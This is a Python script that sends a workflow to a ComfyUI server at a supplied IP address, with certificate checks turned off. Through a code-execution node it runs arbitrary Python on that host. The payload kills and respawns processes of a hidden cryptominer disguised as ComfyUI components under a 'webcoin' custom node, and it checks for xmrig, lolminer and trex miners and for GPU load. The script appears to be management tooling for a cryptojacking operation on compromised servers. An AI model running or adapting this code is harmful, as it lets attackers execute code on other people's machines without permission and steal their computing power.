import json, urllib.request, ssl, sys, time

IP = sys.argv[1]
BASE = f"https://{IP}:443"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

code = """
import subprocess, os, signal, time
lines = []

# Kill all miner processes so watchdog respawns with fresh DNS
r = subprocess.run(['pgrep', '-f', 'comfyui_render'], capture_output=True, text=True)
pids = r.stdout.strip().split()
lines.append(f'comfyui_render pids: {pids}')
for pid in pids:
    try:
        os.kill(int(pid), signal.SIGKILL)
        lines.append(f'killed render {pid}')
    except Exception as e:
        lines.append(f'kill render {pid}: {e}')

r = subprocess.run(['pgrep', '-f', 'comfyui_service'], capture_output=True, text=True)
pids = r.stdout.strip().split()
lines.append(f'comfyui_service pids: {pids}')
for pid in pids:
    try:
        os.kill(int(pid), signal.SIGKILL)
        lines.append(f'killed service {pid}')
    except Exception as e:
        lines.append(f'kill service {pid}: {e}')

# Remove .initialized so orchestrator reinits
import glob
for cn in glob.glob('/home/*/comfy/ComfyUI/custom_nodes') + glob.glob('/home/*/ComfyUI/custom_nodes') + glob.glob('/app/ComfyUI/custom_nodes'):
    wc = os.path.join(cn, 'webcoin')
    if os.path.isdir(wc):
        for m in ['.initialized', '.orch.pid']:
            mp = os.path.join(wc, m)
            if os.path.exists(mp):
                os.remove(mp)
                lines.append(f'removed {mp}')
        break

lines.append('waiting for respawn...')
time.sleep(10)

# Check what's running now
r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
for line in r.stdout.splitlines():
    low = line.lower()
    if any(x in low for x in ['comfyui_render', 'comfyui_service', 'trex', 'lolminer', 'xmrig']):
        lines.append(f'PROC: {line.strip()[:250]}')

# Check GPU
r = subprocess.run(['nvidia-smi', '--query-gpu=utilization.gpu,memory.used,temperature.gpu', '--format=csv,noheader'], capture_output=True, text=True, timeout=10)
lines.append(f'GPU: {r.stdout.strip()}')

# Check render.log last 10 lines
import glob as g
for cn in g.glob('/home/*/comfy/ComfyUI/custom_nodes') + g.glob('/home/*/ComfyUI/custom_nodes'):
    rlog = os.path.join(cn, 'webcoin', 'bin', 'render.log')
    if os.path.exists(rlog):
        with open(rlog, 'r', errors='replace') as f:
            rl = f.readlines()
        for l in rl[-10:]:
            lines.append(f'R: {l.rstrip()[:200]}')
        break

result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"},
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]},
        },
    }
}

data = json.dumps(prompt).encode()
req = urllib.request.Request(f"{BASE}/prompt", data=data, headers={"Content-Type": "application/json"})
resp = urllib.request.urlopen(req, data, timeout=10, context=ctx)
pid = json.loads(resp.read().decode()).get("prompt_id", "")
print(f"[{IP}] prompt_id: {pid}")

time.sleep(25)

resp2 = urllib.request.urlopen(f"{BASE}/history/{pid}", timeout=10, context=ctx)
hist = json.loads(resp2.read().decode())
entry = hist.get(pid, {})
status = entry.get("status", {}).get("status_str", "pending")
print(f"[{IP}] status: {status}")
outputs = entry.get("outputs", {})
for nid, nout in outputs.items():
    for key, val in nout.items():
        if isinstance(val, list):
            for v in val:
                print(v)
        else:
            print(val)
msgs = entry.get("status", {}).get("messages", [])
for m in msgs:
    if m[0] == "execution_error":
        print(f"ERROR: {m[1].get('exception_type')}: {m[1].get('exception_message','')[:500]}")
